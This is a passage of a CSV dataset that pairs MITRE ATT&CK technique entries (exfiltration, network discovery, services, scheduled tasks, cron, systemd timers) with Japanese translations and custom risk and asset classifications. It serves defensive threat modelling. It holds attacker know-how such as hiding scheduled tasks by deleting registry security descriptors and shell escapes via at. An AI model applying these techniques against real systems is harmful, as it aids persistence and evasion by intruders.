T1048.003,T1048,Exfiltration Over Unencrypted Non-C2 Protocol,暗号化されていない非C2プロトコル経由のデータ流出,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco) Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",攻撃者は、既存のコマンド＆コントロール（C2）チャネルとは異なる暗号化されていないネットワークプロトコルを介してデータを流出させることで、データを窃取する可能性がある。データは、メインのC2サーバーとは異なる代替ネットワークロケーションに送信される場合もある。(引用元: copy_cmd_cisco) 攻撃者は、暗号化を使用せずに、ネイティブで暗号化されていないネットワークプロトコル（HTTP、FTP、DNSなど）内でこのデータを難読化することを選択する可能性がある。これには、カスタムまたは公開されているエンコーディング/圧縮アルゴリズム（base64など）や、プロトコルヘッダーやフィールド内へのデータ埋め込みが含まれる可能性がある。,exfiltration,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,data_outflow,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b,2020-03-15T15:37:47.583Z,2025-04-15T19:59:24.041Z,,,,
T1049,,System Network Connections Discovery,システムネットワーク接続の発見,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services. Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), ""net use,"" and ""net session"" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to ""net session"". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)",攻撃者は、ネットワーク経由で情報を照会することにより、現在アクセスしている侵害されたシステム、またはリモートシステムへの、あるいはそれらからのネットワーク接続の一覧を取得しようとする場合があります。 クラウド環境の一部であるシステムへのアクセス権を取得した攻撃者は、接続されているシステムやサービスを特定するために仮想プライベートクラウド（VPC）や仮想ネットワークのマッピングを行う可能性がある。実行されるアクションはオペレーティングシステムに応じて同様の発見手法となるが、得られる情報には攻撃者の目的に関連するクラウド環境の詳細が含まれる場合がある。 クラウドプロバイダーは仮想ネットワークの運用方法が異なる場合があります。（引用元：Amazon AWS VPCガイド）（引用元：Microsoft Azure仮想ネットワーク概要）（引用元：Google VPC概要）同様に、ネットワークデバイスへのアクセス権を得た攻撃者も、接続されたシステムやサービスに関する情報を収集するため、同様の発見活動を行う可能性があります。 この情報を取得するユーティリティやコマンドには、[netstat](https://attack.mitre.org/software/S0104)、[Net](https://attack.mitre.org/software/S0039) の「net use」および「net session」などがあります。 Mac および Linux では、[netstat](https://attack.mitre.org/software/S0104) および <code>lsof</code> を使用して現在の接続を一覧表示できます。<code>who -a</code> および <code>w</code> を使用すると、「net session」と同様に、現在ログインしているユーザーを表示できます。 さらに、ネットワークデバイスに組み込まれたネイティブ機能や[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)も使用できます（例：<code>show ip sockets</code>、<code>show tcp brief</code>）。(引用元: US-CERT-TA18-106A) ESXi サーバーでは、`esxi network ip connection list` コマンドを使用してアクティブなネットワーク接続を一覧表示できます。(引用元: Sygnia ESXi Ransomware 2025),discovery,Windows;IaaS;Linux;macOS;Network Devices;ESXi,credential_abuse,situational_awareness,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475,2017-05-31T21:30:45.139Z,2025-04-15T19:58:45.496Z,,,,
T1050,,New Service,新規サービス,"When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1035).",オペレーティングシステムが起動する際、バックグラウンドでシステム機能を実行する「サービス」と呼ばれるプログラムやアプリケーションを開始することがあります。(引用元: TechNet Services) サービスの実行ファイルへのパスを含む設定情報は、Windows レジストリに保存されます。 攻撃者は、サービス操作ユーティリティの使用やレジストリの直接改変により、起動時に実行されるように設定可能な新規サービスをインストールする可能性があります。サービス名は、関連するオペレーティングシステムや良性のソフトウェアの名称を流用した[偽装](https://attack.mitre.org/techniques/T1036)によって隠蔽される場合があります。 サービスは管理者権限で作成される場合がありますが、SYSTEM権限で実行されるため、攻撃者はサービスを利用して管理者権限からSYSTEM権限への昇格を行うことも可能です。攻撃者は[サービス実行](https://attack.mitre.org/techniques/T1035)を通じてサービスを直接開始することもできます。,persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,privileged_account;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--478aa214-2ca7-4ec0-9978-18798e514790,2017-05-31T21:30:45.613Z,2025-04-25T15:15:28.693Z,,,,
T1051,,Shared Webroot,共有Webルート,"**This technique has been deprecated and should no longer be used.** Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured. This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)",**この手法は非推奨となり、使用すべきではありません。** 攻撃者は、内部からアクセス可能なWebサイトのウェブルートまたはWebコンテンツディレクトリを含むオープンなネットワークファイル共有を介して悪意のあるコンテンツを追加し（引用元: Microsoft Web Root OCT 2016）（引用元: Apache Server 2018）、その後Webブラウザでそのコンテンツにアクセスすることで、サーバーに悪意のあるコンテンツを実行させることが可能です。 悪意のあるコンテンツは通常、Webサーバープロセスのコンテキストと権限で実行され、Webサーバーの設定によってはローカルシステム権限や管理者権限を取得することが多い。この共有アクセスとリモート実行のメカニズムは、Webサーバーを実行しているシステムへの横方向の移動に利用される可能性がある。 例えば、PHPを実行するWebサーバーにネットワーク共有が開放されている場合、攻撃者はリモートアクセスツールとPHPスクリプトをアップロードし、特定のページがアクセスされた際にWebサーバーを実行するシステム上でRATを実行させることが可能となる。(引用元: Webroot PHP 2011),lateral-movement,Windows,script_command_execution,boundary_crossing,privileged_account;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--804c042c-cfe6-449e-bc1a-ba0a998a70db,2017-05-31T21:30:46.047Z,2025-04-15T19:58:46.143Z,,,,
T1052,,Exfiltration Over Physical Medium,物理媒体を介した情報漏洩,"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",攻撃者は、リムーバブルドライブなどの物理媒体を介してデータを漏洩させようとする可能性があります。 エアギャップネットワークの侵害など特定の状況では、ユーザーが持ち込んだ物理媒体やデバイスを介してデータ漏洩が発生する可能性があります。こうした媒体には、外付けハードドライブ、USBドライブ、携帯電話、MP3プレーヤー、その他のリムーバブルストレージや処理デバイスが含まれます。物理媒体やデバイスは、最終的なデータ漏洩ポイントとして、あるいは本来接続されていないシステム間を中継する手段として使用される可能性があります。,exfiltration,Linux;macOS;Windows,data_exfiltration,data_outflow,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549,2017-05-31T21:30:46.461Z,2025-04-15T19:59:17.041Z,,,,
T1052.001,T1052,Exfiltration over USB,USB経由のデータ流出,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",攻撃者はUSB接続の物理デバイスを介したデータ漏洩を試みる可能性がある。エアギャップネットワーク侵害などの特定の状況下では、ユーザーが持ち込んだUSBデバイスを介した漏洩が発生する可能性がある。USBデバイスは最終的な漏洩ポイントとして、あるいは本来接続されていないシステム間を移動するための中継点として使用される可能性がある。,exfiltration,Linux;Windows;macOS,data_exfiltration,data_outflow,user_interaction;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829,2020-03-11T13:50:11.467Z,2025-04-15T19:58:55.347Z,,,,
T1053,,Scheduled Task/Job,スケジュールされたタスク/ジョブ,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security) Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",攻撃者は、悪意のあるコードの初回または定期的な実行を容易にするために、タスクスケジューリング機能を悪用する可能性があります。主要なオペレーティングシステムにはすべて、プログラムやスクリプトを指定された日時で実行するようにスケジュールするユーティリティが存在します。適切な認証が満たされている場合（例：Windows環境におけるRPCおよびファイルとプリンターの共有）、リモートシステム上でもタスクをスケジュールできます。 リモートシステムでのタスクスケジュールには通常、そのシステム上の管理者グループまたは特権グループのメンバーであることが必要です（出典: TechNet タスク スケジューラーのセキュリティ）。攻撃者はタスクスケジューリングを悪用し、システム起動時や定期的な実行によりプログラムを実行して永続化を図ることがあります。これらのメカニズムは、指定されたアカウント（昇格された権限/特権を持つものなど）のコンテキストでプロセスを実行するためにも悪用可能です。 [システムバイナリプロキシ実行](https://attack.mitre.org/techniques/T1218)と同様に、攻撃者はタスクスケジューリングを悪用し、信頼されたシステムプロセス下での一時的な実行を隠蔽する可能性もあります（引用元：ProofPoint Serpent）。,execution;persistence;privilege-escalation,Windows;Linux;macOS;Containers;ESXi,script_command_execution,privilege_gain,authentication_system;privileged_account;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9,2017-05-31T21:30:46.977Z,2025-04-15T21:41:11.473Z,,,,
T1053.001,,At (Linux),At (Linux),"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial, recurring, or future execution of malicious code. The [at](https://attack.mitre.org/software/S0110) command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux) An adversary may use [at](https://attack.mitre.org/software/S0110) in Linux environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account. Adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",攻撃者は[at](https://attack.mitre.org/software/S0110)ユーティリティを悪用し、悪意のあるコードの初回実行、定期実行、将来実行のためのタスクスケジューリングを実行する可能性があります。Linuxオペレーティングシステム内の[at](https://attack.mitre.org/software/S0110)コマンドは、管理者がタスクをスケジュールすることを可能にします。（引用元：Kifarunix - Linuxにおけるタスクスケジューリング）攻撃者は、Linux環境において[at](https://attack.mitre.org/software/S0110)を悪用し、システム起動時やスケジュールに基づいてプログラムを実行し、永続化を図ることがある。 [at](https://attack.mitre.org/software/S0110) は横方向移動の一環としてリモート実行を実行したり、指定されたアカウントのコンテキストでプロセスを実行したりするためにも悪用される可能性があります。 攻撃者はまた、インタラクティブなシステムシェルを生成するタスクを使用したり、システムコマンドを実行したりすることで、制限された環境からの脱出のために[at](https://attack.mitre.org/software/S0110)を悪用する可能性があります。 同様に、バイナリが <code>sudo</code> 経由でスーパーユーザーとして実行が許可されている場合、[at](https://attack.mitre.org/software/S0110) は [権限昇格](https://attack.mitre.org/tactics/TA0004) にも利用される可能性がある。(引用元: GTFObins at),execution;persistence;privilege-escalation,Linux,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e,2019-12-03T12:59:36.749Z,2025-04-18T17:59:20.778Z,,,,
T1053.002,T1053,At,At,"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason) On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at) Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM). In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",攻撃者は、悪意のあるコードの初期実行または定期的な実行のために、タスクスケジューリングを実行するために[at](https://attack.mitre.org/software/S0110)ユーティリティを悪用する可能性があります。[at](https://attack.mitre.org/software/S0110)ユーティリティは、指定された日時でタスクをスケジュールするために、Windows、Linux、macOS内に実行可能ファイルとして存在します。 Windows環境では[Scheduled Task](https://attack.mitre.org/techniques/T1053/005)の[schtasks](https://attack.mitre.org/software/S0111)に取って代わられ非推奨となっているものの、 [at](https://attack.mitre.org/software/S0110)を使用するには、タスク スケジューラ サービスが実行中であること、およびユーザーがローカルの Administrators グループのメンバーとしてログオンしていることが必要です。 攻撃者は`at`コマンドを明示的に実行する以外に、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)の`Win32_ScheduledJob` WMIクラスを直接利用して[at](https://attack.mitre.org/software/S0110)によるタスクのスケジュール設定を行う可能性もあります。(引用元: Cybereason『Malicious Life』)Linux および macOS では、スーパーユーザーと <code>at.allow</code> ファイルに追加されたユーザーが [at](https://attack.mitre.org/software/S0110) を呼び出せます。<code>at.allow</code> ファイルが存在しない場合、<code>at.deny</code> ファイルがチェックされます。 <code>at.deny</code>にリストされていないすべてのユーザー名は、[at](https://attack.mitre.org/software/S0110)の実行が許可されます。 <code>at.deny</code>が存在し空の場合、[at](https://attack.mitre.org/software/S0110)のグローバル使用が許可されます。いずれのファイルも存在しない場合（これが基本設定であることが多い）、スーパーユーザーのみが[at](https://attack.mitre.org/software/S0110)を使用できます。(引用元: Linux at) 攻撃者は[at](https://attack.mitre.org/software/S0110)を悪用し、システム起動時やスケジュールに基づいてプログラムを実行し、[Persistence](https://attack.mitre.org/tactics/TA0003)を実現する可能性があります。 [at](https://attack.mitre.org/software/S0110)は、[横方向移動](https://attack.mitre.org/tactics/TA0008)の一環としてリモート [横方向の移動](https://attack.mitre.org/tactics/TA0008)の一環として[実行](https://attack.mitre.org/tactics/TA0002)を実行したり、指定されたアカウント（SYSTEMなど）のコンテキストでプロセスを実行したりするために悪用される可能性があります。 Linux環境では、攻撃者は[at](https://attack.mitre.org/software/S0110)を悪用し、タスクを使用して対話型システムシェルを生成したりシステムコマンドを実行したりすることで、制限された環境からの脱出を図る可能性があります。 同様に、バイナリが <code>sudo</code> 経由でスーパーユーザーとして実行が許可されている場合、[at](https://attack.mitre.org/software/S0110) は [権限昇格](https://attack.mitre.org/tactics/TA0004) にも使用される可能性があります。(引用元: GTFObins at),execution;persistence;privilege-escalation,Windows;Linux;macOS,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0,2019-11-27T13:52:45.853Z,2025-04-15T19:59:21.266Z,,,,
T1053.003,T1053,Cron,Cron,"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems. The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths. An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)",攻撃者は<code>cron</code>ユーティリティを悪用し、悪意のあるコードの初回または定期的な実行のためのタスクスケジューリングを実行する可能性があります。(引用: 20 macOS Common Tools and Techniques)<code>cron</code>ユーティリティは、Unix系オペレーティングシステム向けの時間ベースのジョブスケジューラです。<code>crontab</code>ファイルには、実行されるcronエントリのスケジュールと指定された実行時刻が含まれます。 <code>crontab</code>ファイルはOS固有のファイルパスに保存される。攻撃者はLinuxやUnix環境で<code>cron</code>を利用し、システム起動時やスケジュールに基づいてプログラムを実行し、[永続化](https://attack.mitre.org/tactics/TA0003)を図ることが可能である。 ESXi環境では、cronジョブはcrontabファイル（例：`/var/spool/cron/crontabs/root`）を介して直接作成する必要があります。(引用元: CloudSEK ESXiArgs 2023),execution;persistence;privilege-escalation,Linux;macOS;ESXi,other,privilege_gain,privileged_account;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c,2019-12-03T14:25:00.538Z,2025-04-15T19:58:16.429Z,,,,
T1053.004,T1053,Launchd,Launchd,"This technique is deprecated due to the inaccurate usage. The report cited did not provide technical detail as to how the malware interacted directly with launchd rather than going through known services. Other system services are used to interact with launchd rather than launchd being used by itself. Adversaries may abuse the <code>Launchd</code> daemon to perform task scheduling for initial or recurring execution of malicious code. The <code>launchd</code> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). An adversary may use the <code>launchd</code> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <code>launchd</code> can also be abused to run a process under the context of a specified account. Daemons, such as <code>launchd</code>, run with the permissions of the root user account, and will operate regardless of which user account is logged in.",この手法は不正確な使用法のため非推奨です。引用された報告書は、マルウェアが既知のサービスを経由せず直接launchdと相互作用した技術的詳細を提供していません。他のシステムサービスはlaunchd自体を使用するのではなく、launchdとの相互作用に使用されます。攻撃者は<code>Launchd</code>デーモンを悪用し、悪意のあるコードの初期または定期的な実行のためのタスクスケジューリングを実行する可能性があります。 macOSにネイティブに存在する<code>launchd</code>デーモンは、オペレーティングシステム内のサービスの読み込みと維持を担当します。このプロセスは、<code>/System/Library/LaunchDaemons</code>および<code>/Library/LaunchDaemons</code>にあるプロパティリスト（plist）ファイルから、オンデマンド起動のシステムレベルデーモンごとのパラメータを読み込みます （引用元: AppleDocs Launch Agent Daemons）。これらのLaunchDaemonsは、起動される実行ファイルを指すプロパティリストファイルを持っています（引用元: Methods of Mac Malware Persistence）。 攻撃者は、macOS環境において<code>launchd</code>デーモンを利用し、システム起動時やスケジュールに基づいて実行される新たな実行ファイルをスケジュール設定し、永続化を図ることが可能です。<code>launchd</code>は、指定されたアカウントのコンテキストでプロセスを実行するために悪用されることもあります。<code>launchd</code>などのデーモンは、rootユーザーアカウントの権限で実行され、どのユーザーアカウントがログインしているかに関係なく動作します。,execution;persistence;privilege-escalation,macOS,discovery_enumeration,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),deprecated;subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3,2019-12-03T14:15:27.452Z,2025-04-15T19:58:50.783Z,,,,
T1053.005,T1053,Scheduled Task,スケジュールされたタスク,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team) An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent) Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments)",攻撃者はWindowsタスクスケジューラを悪用し、悪意のあるコードの初回または定期的な実行のためのタスクスケジュールを設定する可能性があります。Windowsではタスクスケジューラにアクセスする方法は複数存在します。コマンドラインで直接[schtasks](https://attack.mitre.org/software/S0111)ユーティリティを実行するか、コントロールパネルの「管理ツール」セクションからGUI経由でタスクスケジューラを開くことができます。(引用元: Stack Overflow) 攻撃者はWindowsタスクスケジューラの.NETラッパーを利用する場合や、Windows netapi32ライブラリと[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) を組み合わせてスケジュールされたタスクを作成する場合もある。 攻撃者はまた、WMIクラス`PS_ScheduledTask`を活用しXMLパス経由でスケジュールされたタスクを作成するPowerShellコマンドレット`Invoke-CimMethod`を利用する場合もある。(引用元: Red Canary - Atomic Red Team)攻撃者は、永続化のためにシステム起動時またはスケジュールに基づいてプログラムを実行するためにWindowsタスクスケジューラを使用する可能性がある。 Windows タスク スケジューラは、横方向の移動の一環としてリモート実行を実行したり、指定されたアカウント（SYSTEM など）のコンテキストでプロセスを実行したりするためにも悪用される可能性があります。 [システムバイナリプロキシ実行](https://attack.mitre.org/techniques/T1218)と同様に、攻撃者はWindowsタスクスケジューラを悪用し、署名済み/信頼されたシステムプロセス下での一時的な実行を隠蔽する可能性もあります。（引用元：ProofPoint Serpent）攻撃者はまた、防御ツールやタスク列挙用の手動クエリでは検出されない「隠蔽された」スケジュールされたタスク（すなわち[Hide Artifacts](https://attack.mitre.org/techniques/T1564)）を作成する可能性があります。 具体的には、攻撃者は関連するセキュリティ記述子（SD）レジストリ値を削除することで、`schtasks /query` およびタスク スケジューラからタスクを隠蔽できます（この値の削除には SYSTEM 権限が必要です）。(引用: SigmaHQ)(引用: Tarrask scheduled task) また、関連レジストリキー内のメタデータ（例: `Index`値）を変更するなど、タスクを隠蔽する代替手法を採用する可能性もある。(引用: Defending Against Scheduled Task Attacks in Windows Environments),execution;persistence;privilege-escalation,Windows,script_command_execution,privilege_gain,authentication_system;privileged_account;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003;TA0004,attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9,2019-11-27T14:58:00.429Z,2025-04-15T19:58:01.010Z,,,,
T1053.006,T1053,Systemd Timers,Systemdタイマー,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control) Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>. An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using 